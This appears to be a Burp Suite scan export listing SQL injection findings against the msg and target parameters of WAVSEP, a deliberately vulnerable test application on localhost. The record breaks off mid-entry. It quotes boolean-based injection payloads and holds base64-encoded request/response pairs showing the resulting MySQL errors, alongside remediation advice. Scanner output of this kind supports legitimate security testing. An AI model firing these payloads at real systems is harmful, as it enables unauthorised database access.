<?xml version="1.0"?>
<!DOCTYPE issues [
<!ELEMENT issues (issue*)>
<!ATTLIST issues burpVersion CDATA "">
<!ATTLIST issues exportTime CDATA "">
<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*, staticAnalysis*, dynamicAnalysis*, prototypePollution*)>
<!ELEMENT serialNumber (#PCDATA)>
<!ELEMENT type (#PCDATA)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT path (#PCDATA)>
<!ELEMENT location (#PCDATA)>
<!ELEMENT severity (#PCDATA)>
<!ELEMENT confidence (#PCDATA)>
<!ELEMENT issueBackground (#PCDATA)>
<!ELEMENT remediationBackground (#PCDATA)>
<!ELEMENT references (#PCDATA)>
<!ELEMENT vulnerabilityClassifications (#PCDATA)>
<!ELEMENT issueDetail (#PCDATA)>
<!ELEMENT issueDetailItems (issueDetailItem*)>
<!ELEMENT issueDetailItem (#PCDATA)>
<!ELEMENT remediationDetail (#PCDATA)>
<!ELEMENT requestresponse (request?, response?, responseRedirected?)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request method CDATA "">
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT responseRedirected (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT message (#PCDATA)>
<!ELEMENT conversation (#PCDATA)>
<!ELEMENT recipient (#PCDATA)>
<!ELEMENT recipients (recipient*)>
<!ELEMENT smtp (sender, recipients, message, conversation)>
<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>
<!ELEMENT interactionType (#PCDATA)>
<!ELEMENT originIp (#PCDATA)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT lookupType (#PCDATA)>
<!ELEMENT lookupHost (#PCDATA)>
<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>
<!ELEMENT parameterName (#PCDATA)>
<!ELEMENT platform (#PCDATA)>
<!ELEMENT signature (#PCDATA)>
<!ELEMENT stackTrace (#PCDATA)>
<!ELEMENT parameterValue (#PCDATA)>
<!ELEMENT dynamicAnalysis (source, sink, sourceStackTrace, sinkStackTrace, eventListenerStackTrace, sourceValue, sinkValue, eventHandlerData, eventHandlerDataType, eventHandlerManipulatedData, poc, origin, isOriginChecked, sourceElementId, sourceElementName, eventFiredEventName, eventFiredElementId, eventFiredElementName, eventFiredOuterHtml)>
<!ELEMENT prototypePollution (poc, pollutionTechnique, pollutionType)>
<!ELEMENT staticAnalysis (source, sink, codeSnippets)>
<!ELEMENT source (#PCDATA)>
<!ELEMENT sink (#PCDATA)>
<!ELEMENT sourceStackTrace (#PCDATA)>
<!ELEMENT sinkStackTrace (#PCDATA)>
<!ELEMENT eventListenerStackTrace (#PCDATA)>
<!ELEMENT sourceValue (#PCDATA)>
<!ELEMENT sinkValue (#PCDATA)>
<!ELEMENT eventHandlerData (#PCDATA)>
<!ELEMENT eventHandlerDataType (#PCDATA)>
<!ELEMENT sourceElementId (#PCDATA)>
<!ELEMENT sourceElementName (#PCDATA)>
<!ELEMENT eventFiredEventName (#PCDATA)>
<!ELEMENT eventFiredElementId (#PCDATA)>
<!ELEMENT eventFiredElementName (#PCDATA)>
<!ELEMENT eventFiredOuterHtml (#PCDATA)>
<!ELEMENT eventHandlerManipulatedData (#PCDATA)>
<!ELEMENT poc (#PCDATA)>
<!ELEMENT origin (#PCDATA)>
<!ELEMENT isOriginChecked (#PCDATA)>
<!ELEMENT codeSnippets (codeSnippet*)>
<!ELEMENT codeSnippet (#PCDATA)>
<!ELEMENT pollutionTechnique (#PCDATA)>
<!ELEMENT pollutionType (#PCDATA)>
]>
<issues burpVersion="2024.2.1.5" exportTime="Tue Apr 23 11:24:24 CEST 2024">
  <issue>
    <serialNumber>2479905013937256448</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>68712210' or 6520=6520-- </b> was submitted in the msg parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9tc2c9cmVhZG1lJyZ0YXJnZXQ9YUBhLmNvbSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzY4DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJ2FAYS5jb20nKScgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9tc2c9cmVhZG1lJycmdGFyZ2V0PWFAYS5jb20gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9tc2c9cmVhZG1lNjg3MTIyMTAnJTIwb3IlMjA2NTIwJTNkNjUyMC0tJTIwJnRhcmdldD1hQGEuY29tIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzU5DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4688229076049767424</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp [target parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>target</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the target parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>28943248' or 1047=1047-- </b> was submitted in the target parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9tc2c9cmVhZG1lJnRhcmdldD1hQGEuY29tJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzcwDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJydhQGEuY29tJycpJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
